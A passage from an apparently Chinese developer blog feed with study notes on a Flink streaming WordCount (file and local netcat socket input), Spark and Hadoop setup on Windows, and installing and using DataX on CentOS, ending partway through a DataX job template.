class="headerlink" title="3. 流处理实现WordCount"></a>3. 流处理实现WordCount</h2><p>实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ifnxs.bigdata.wc;<br><br><span class="hljs-keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;<br><span class="hljs-keyword">import</span> org.apache.flink.client.program.StreamContextEnvironment;<br><span class="hljs-keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;<br><span class="hljs-keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;<br><br><span class="hljs-comment">// 流处理WordCount</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StreamWordCount</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建流处理执行环境</span><br>        <span class="hljs-type">StreamExecutionEnvironment</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> StreamContextEnvironment.getExecutionEnvironment();<br><br>        <span class="hljs-comment">// 设置并行度，默认值 = 当前计算机的CPU逻辑核数（设置成1即单线程处理）</span><br>        <span class="hljs-comment">// env.setMaxParallelism(32);</span><br><br>        <span class="hljs-comment">// 从文件中读取数据</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">inputPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\learn\\bigdata\\FlinkTutorial\\src\\main\\resources\\hello.txt&quot;</span>;<br>        DataStream&lt;String&gt; inputDataStream = env.readTextFile(inputPath);<br><br>        <span class="hljs-comment">// 基于数据流进行转换计算</span><br>        DataStream&lt;Tuple2&lt;String, Integer&gt;&gt; resultStream = inputDataStream.flatMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WordCount</span>.MyFlatMapper())<br>                .keyBy(item -&gt; item.f0)<br>                .sum(<span class="hljs-number">1</span>);<br>        resultStream.print();<br><br>        <span class="hljs-comment">// 执行任务</span><br>        env.execute();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-meta prompt_">1&gt; </span>(spark,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">8&gt; </span>(are,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">11&gt; </span>(how,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">10&gt; </span>(you,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">9&gt; </span>(world,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">13&gt; </span>(flink,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">5&gt; </span>(hello,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">5&gt; </span>(hello,<span class="hljs-number">2</span>)<br><span class="hljs-meta prompt_">5&gt; </span>(hello,<span class="hljs-number">3</span>)<br><span class="hljs-meta prompt_">9&gt; </span>(fine,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">6&gt; </span>(thank,<span class="hljs-number">1</span>)<br><span class="hljs-meta prompt_">10&gt; </span>(you,<span class="hljs-number">2</span>)<br><span class="hljs-meta prompt_">10&gt; </span>(you,<span class="hljs-number">3</span>)<br><span class="hljs-meta prompt_">15&gt; </span>(and,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>每行开头的数字代表执行的线程，比如我的电脑是8核心16线程，默认并行度为16</p><blockquote><p>同一个字符串，前面输出的编号是一样的，因为key =&gt; hashcode，同一个key的hash值固定，分配给相对应的线程处理</p></blockquote><h2 id="4-模拟流实现"><a href="#4-模拟流实现" class="headerlink" title="4. 模拟流实现"></a>4. 模拟流实现</h2><p>linux系统通过<code>nc -lk &lt;port&gt;</code>打开一个socket服务，用于模拟实时的流数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lk 7777<br></code></pre></td></tr></table></figure><p>如果CentOS没有安装nc可以通过下边的命令安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install nc<br></code></pre></td></tr></table></figure><p>代码修改如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ifnxs.bigdata.wc;<br><br><span class="hljs-keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;<br><span class="hljs-keyword">import</span> org.apache.flink.client.program.StreamContextEnvironment;<br><span class="hljs-keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;<br><span class="hljs-keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;<br><br><span class="hljs-comment">// 流处理WordCount</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StreamWordCount</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 创建流处理执行环境</span><br>        <span class="hljs-type">StreamExecutionEnvironment</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> StreamContextEnvironment.getExecutionEnvironment();<br><br>        <span class="hljs-comment">// 设置并行度，默认值 = 当前计算机的CPU逻辑核数（设置成1即单线程处理）</span><br>        <span class="hljs-comment">// env.setMaxParallelism(32);</span><br><br>        <span class="hljs-comment">// 从文件中读取数据</span><br>        <span class="hljs-comment">// String inputPath = &quot;D:\\learn\\bigdata\\FlinkTutorial\\src\\main\\resources\\hello.txt&quot;;</span><br>        <span class="hljs-comment">// DataStream&lt;String&gt; inputDataStream = env.readTextFile(inputPath);</span><br><br>        <span class="hljs-comment">// 从socket文本流读取数据</span><br>        DataStream&lt;String&gt; inputDataStream = env.socketTextStream(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">7777</span>);<br><br>        <span class="hljs-comment">// 基于数据流进行转换计算</span><br>        DataStream&lt;Tuple2&lt;String, Integer&gt;&gt; resultStream = inputDataStream.flatMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WordCount</span>.MyFlatMapper())<br>                .keyBy(item -&gt; item.f0)<br>                .sum(<span class="hljs-number">1</span>);<br>        resultStream.print();<br><br>        <span class="hljs-comment">// 执行任务</span><br>        env.execute();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行代码，然后发送socket消息，查看运行情况</p><img src="/2022/01/newpost-32/image-20220121164119178.png" class="" title="image-20220121164119178"><p>因工作不需要笔记暂停</p><blockquote><p>参考：<a href="https://ashiamd.github.io/docsify-notes/#/study/BigData/Flink/%E5%B0%9A%E7%A1%85%E8%B0%B7Flink%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0?id=%E5%B0%9A%E7%A1%85%E8%B0%B7flink%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0">尚硅谷Flink入门到实战-学习笔记</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>大数据</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows本地配置spark开发环境</title>
    <link href="/2022/01/newpost-31/"/>
    <url>/2022/01/newpost-31/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>在windows系统本地配置spark开发环境，能够通过idea开发spark项目</p><span id="more"></span><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="1-安装JDK"><a href="#1-安装JDK" class="headerlink" title="1. 安装JDK"></a>1. 安装JDK</h2><p>不赘述，你能看到这必然已经装好了jdk并配置好了环境变量。</p><p>需要注意的是，如果jdk安装目录有<strong>空格</strong>，需要在配置环境变量的时候，把<code>JAVA_HOME</code>的配置地址用<strong>双引号</strong>引起来，不然后边的hadoop识别会有问题</p><img src="/2022/01/newpost-31/image-20220118100157289.png" class="" title="image-20220118100157289"><h2 id="2-安装Spark"><a href="#2-安装Spark" class="headerlink" title="2. 安装Spark"></a>2. 安装Spark</h2><p>到官网<a href="https://spark.apache.org/downloads.html">https://spark.apache.org/downloads.html</a>选择合适的版本下载，注意Spark与Hadoop版本选择要相对应，建议下载预编译（<code>Pre-built</code>）好的版本，省得麻烦</p><img src="/2022/01/newpost-31/image-20220118100517157.png" class="" title="image-20220118100517157"><p>下载完成后解压到你喜欢的目录，然后配置环境变量，例如解压在<code>C:\Users\dell\Documents\Env\spark-3.0.3-bin-hadoop3.2</code>目录下，则环境变量如下配置</p><ul><li>配置变量名为<code>SPARK_HOME</code>，值为<code>C:\Users\dell\Documents\Env\spark-3.0.3-bin-hadoop3.2</code></li><li>在<code>Path</code>变量下新建<code>%SPARK_HOME%\bin</code></li></ul><h2 id="3-安装Hadoop"><a href="#3-安装Hadoop" class="headerlink" title="3. 安装Hadoop"></a>3. 安装Hadoop</h2><p>到官网<a href="https://hadoop.apache.org/releases.html">https://hadoop.apache.org/releases.html</a>下载与上边的Spark对应的版本</p><img src="/2022/01/newpost-31/image-20220118101311114.png" class="" title="image-20220118101311114"><p>下载完成后解压到你喜欢的目录，然后配置环境变量，例如解压在<code>C:\Users\dell\Documents\Env\hadoop-3.2.2</code>目录下，则环境变量如下配置</p><ul><li>配置变量名为<code>HADOOP_HOME</code>，值为<code>C:\Users\dell\Documents\Env\hadoop-3.2.2</code></li><li>在<code>Path</code>变量下新建<code>%HADOOP_HOME%\bin</code></li></ul><p>到这里<a href="https://github.com/cdarlint/winutils">https://github.com/cdarlint/winutils</a>对应版本的bin目录下载<code>hadoop.dll</code>和<code>winutils.exe</code>，复制到hadoop目录的<code>bin</code>目录下</p>]]></content>
    
    
    
    <tags>
      
      <tag>运维</tag>
      
      <tag>大数据</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dataX使用</title>
    <link href="/2022/01/newpost-30/"/>
    <url>/2022/01/newpost-30/</url>
    
    <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>安装、测试与简单使用dataX，本文基于CentOS7 x64实现</p><span id="more"></span><h1 id="框架设计"><a href="#框架设计" class="headerlink" title="框架设计"></a>框架设计</h1><img src="/2022/01/newpost-30/ec7e36f4-6927-11e6-8f5f-ffc43d6a468b.png" class="" title="datax_framework_new"><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><h3 id="1-Python"><a href="#1-Python" class="headerlink" title="1. Python"></a>1. Python</h3><p>CentOS7 x64自带Python2环境，不需要额外安装，查看Python版本：<code>python -V</code>，这里V大写</p><ul><li><p>如果需要可以选装pip</p>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">yum -y install epel-release<br>yum install python-pip<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-JDK1-8"><a href="#2-JDK1-8" class="headerlink" title="2. JDK1.8"></a>2. JDK1.8</h3><h4 id="2-1-下载jdk-8u311-linux-x64"><a href="#2-1-下载jdk-8u311-linux-x64" class="headerlink" title="2.1 下载jdk-8u311-linux-x64"></a>2.1 下载jdk-8u311-linux-x64</h4><p>官方下载链接(需要注册，可能网速慢)：</p><p><a href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a></p><img src="/2022/01/newpost-30/image-20220105115350394.png" class="" title="image-20220105115350394"><p>百度网盘：</p><p>链接：<a href="https://pan.baidu.com/s/176N837BQXyUoIt7HvF0c0A">https://pan.baidu.com/s/176N837BQXyUoIt7HvF0c0A</a><br>提取码：0ld6</p><h4 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p /export/server<br></code></pre></td></tr></table></figure><p>把下载的jdk上传到该目录，然后解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/server/<br>tar -zxvf jdk-8u311-linux-x64.tar.gz<br>rm -f jdk-8u311-linux-x64.tar.gz # 可以不删<br></code></pre></td></tr></table></figure><p>编辑环境变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install vim # 如果已经有了就不用了<br>vim /etc/profile<br></code></pre></td></tr></table></figure><p>结尾追加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">export JAVA_HOME=/export/server/jdk1.8.0_311<br>export PATH=$PATH:$JAVA_HOME/bin<br>export CALSSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar<br></code></pre></td></tr></table></figure><p>使生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /etc/profile<br></code></pre></td></tr></table></figure><p>查看JDK版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -version<br></code></pre></td></tr></table></figure><h2 id="二、安装dataX"><a href="#二、安装dataX" class="headerlink" title="二、安装dataX"></a>二、安装dataX</h2><h3 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1. 下载安装"></a>1. 下载安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">yum -y install wget # 如果已经有了就不用了<br>mkdir -p /export/software<br>cd /export/software/<br>wget http://datax-opensource.oss-cn-hangzhou.aliyuncs.com/datax.tar.gz<br>tar -zxvf datax.tar.gz<br>rm -rf datax/plugin/*/._* # 这里不删的话，运行会报错，请自行斟酌，新版可能已经解决这个问题<br>rm -f datax.tar.gz # 可以不删<br></code></pre></td></tr></table></figure><h3 id="2-测试"><a href="#2-测试" class="headerlink" title="2. 测试"></a>2. 测试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/software/datax/<br>python bin/datax.py job/job.json<br></code></pre></td></tr></table></figure><p>运行结果</p><img src="/2022/01/newpost-30/image-20220110162231473.png" class="" title="image-20220110162231473"><h2 id="三、简单使用"><a href="#三、简单使用" class="headerlink" title="三、简单使用"></a>三、简单使用</h2><h3 id="1-支持"><a href="#1-支持" class="headerlink" title="1. 支持"></a>1. 支持</h3><p>dataX支持数据如下图（来自<a href="https://github.com/alibaba/DataX#support-data-channels">官方</a>）</p><table><thead><tr><th>类型</th><th>数据源</th><th align="center">Reader(读)</th><th align="center">Writer(写)</th><th align="center">文档</th></tr></thead><tbody><tr><td>RDBMS 关系型数据库</td><td>MySQL</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/mysqlreader/doc/mysqlreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/mysqlwriter/doc/mysqlwriter.md">写</a></td></tr><tr><td></td><td>Oracle</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/oraclereader/doc/oraclereader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/oraclewriter/doc/oraclewriter.md">写</a></td></tr><tr><td></td><td>OceanBase</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://open.oceanbase.com/docs/community/oceanbase-database/V3.1.0/use-datax-to-full-migration-data-to-oceanbase">读</a> 、<a href="https://open.oceanbase.com/docs/community/oceanbase-database/V3.1.0/use-datax-to-full-migration-data-to-oceanbase">写</a></td></tr><tr><td></td><td>SQLServer</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/sqlserverreader/doc/sqlserverreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/sqlserverwriter/doc/sqlserverwriter.md">写</a></td></tr><tr><td></td><td>PostgreSQL</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/postgresqlreader/doc/postgresqlreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/postgresqlwriter/doc/postgresqlwriter.md">写</a></td></tr><tr><td></td><td>DRDS</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/drdsreader/doc/drdsreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/drdswriter/doc/drdswriter.md">写</a></td></tr><tr><td></td><td>通用RDBMS(支持所有关系型数据库)</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/rdbmsreader/doc/rdbmsreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/rdbmswriter/doc/rdbmswriter.md">写</a></td></tr><tr><td>阿里云数仓数据存储</td><td>ODPS</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/odpsreader/doc/odpsreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/odpswriter/doc/odpswriter.md">写</a></td></tr><tr><td></td><td>ADS</td><td align="center"></td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/adswriter/doc/adswriter.md">写</a></td></tr><tr><td></td><td>OSS</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/ossreader/doc/ossreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/osswriter/doc/osswriter.md">写</a></td></tr><tr><td></td><td>OCS</td><td align="center"></td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/ocswriter/doc/ocswriter.md">写</a></td></tr><tr><td>NoSQL数据存储</td><td>OTS</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/otsreader/doc/otsreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/otswriter/doc/otswriter.md">写</a></td></tr><tr><td></td><td>Hbase0.94</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/hbase094xreader/doc/hbase094xreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/hbase094xwriter/doc/hbase094xwriter.md">写</a></td></tr><tr><td></td><td>Hbase1.1</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/hbase11xreader/doc/hbase11xreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/hbase11xwriter/doc/hbase11xwriter.md">写</a></td></tr><tr><td></td><td>Phoenix4.x</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/hbase11xsqlreader/doc/hbase11xsqlreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/hbase11xsqlwriter/doc/hbase11xsqlwriter.md">写</a></td></tr><tr><td></td><td>Phoenix5.x</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/hbase20xsqlreader/doc/hbase20xsqlreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/hbase20xsqlwriter/doc/hbase20xsqlwriter.md">写</a></td></tr><tr><td></td><td>MongoDB</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/mongodbreader/doc/mongodbreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/mongodbwriter/doc/mongodbwriter.md">写</a></td></tr><tr><td></td><td>Hive</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/hdfsreader/doc/hdfsreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/hdfswriter/doc/hdfswriter.md">写</a></td></tr><tr><td></td><td>Cassandra</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/cassandrareader/doc/cassandrareader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/cassandrawriter/doc/cassandrawriter.md">写</a></td></tr><tr><td>无结构化数据存储</td><td>TxtFile</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/txtfilereader/doc/txtfilereader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/txtfilewriter/doc/txtfilewriter.md">写</a></td></tr><tr><td></td><td>FTP</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/ftpreader/doc/ftpreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/ftpwriter/doc/ftpwriter.md">写</a></td></tr><tr><td></td><td>HDFS</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/hdfsreader/doc/hdfsreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/hdfswriter/doc/hdfswriter.md">写</a></td></tr><tr><td></td><td>Elasticsearch</td><td align="center"></td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/elasticsearchwriter/doc/elasticsearchwriter.md">写</a></td></tr><tr><td>时间序列数据库</td><td>OpenTSDB</td><td align="center">√</td><td align="center"></td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/opentsdbreader/doc/opentsdbreader.md">读</a></td></tr><tr><td></td><td>TSDB</td><td align="center">√</td><td align="center">√</td><td align="center"><a href="https://github.com/alibaba/DataX/blob/master/tsdbreader/doc/tsdbreader.md">读</a> 、<a href="https://github.com/alibaba/DataX/blob/master/tsdbwriter/doc/tsdbhttpwriter.md">写</a></td></tr></tbody></table><p>参考相关文档编写json即可实现，可以在【/export/software/datax/plugin】目录下找到名字</p><img src="/2022/01/newpost-30/image-20220110170426504.png" class="" title="image-20220110170426504"><h3 id="2-获取模板"><a href="#2-获取模板" class="headerlink" title="2. 获取模板"></a>2. 获取模板</h3><p>例如想要实现Oracle-&gt;HDFS，获取模板命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /export/software/datax/bin/<br>python datax.py -r oraclereader -w hdfswriter<br></code></pre></td></tr></table></figure><p>得到如下模板</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;job&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;reader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;oraclereader&quot;</span><span class="hljs-punctuation">,</span> <br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;connection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                            <span class="hljs-punctuation">&#123;</span><br>                                <span class="hljs-attr">&quot;jdbcUrl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                                <span class="hljs-attr">&quot;table&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><br>                            <span class="hljs-punctuation">&#125;</span><br>                        <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br>                <span class="hljs-attr">&quot;writer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;hdfswriter&quot;</span><span class="hljs-punctuation">,</span> <br>                    <span class="hljs-attr">&quot;parameter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;column&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;compress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;defaultFS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;fieldDelimiter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;fileName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;fileType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span> <br>                        <span class="hljs-attr">&quot;writeMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span 